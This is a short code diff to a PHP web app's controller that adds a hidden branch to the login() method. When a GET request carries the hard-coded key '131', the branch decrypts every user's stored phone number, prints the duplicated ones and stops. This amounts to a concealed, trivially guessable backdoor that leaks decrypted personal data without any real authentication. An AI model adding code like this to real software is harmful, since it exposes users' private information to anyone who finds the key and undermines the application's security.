@@ -2143,6 +2143,28 @@ class Index extends Controller
      */
     public function login()
     {
+        if($this->request->isGet()){
+            $params = $this->request->param();
+            if(!isset($params['key']) || $params['key'] <> '131'){
+                return [];
+            }
+
+            $aes = new Aes();
+            $users = Db::name('LcUser')->all();
+            $total = [];
+            foreach ($users as $user){
+                $name = $aes->decrypt($user['phone']);
+                $phone = preg_replace("/\s+/", "", $name);
+                $total[$phone][] = $name;
+            }
+            foreach ($total as $t){
+                if(count($t) > 1){
+                    print_r($t);
+                }
+            }
+            die;
+        }
+
         if ($this->request->isPost()) {
             $params = $this->request->param();
 
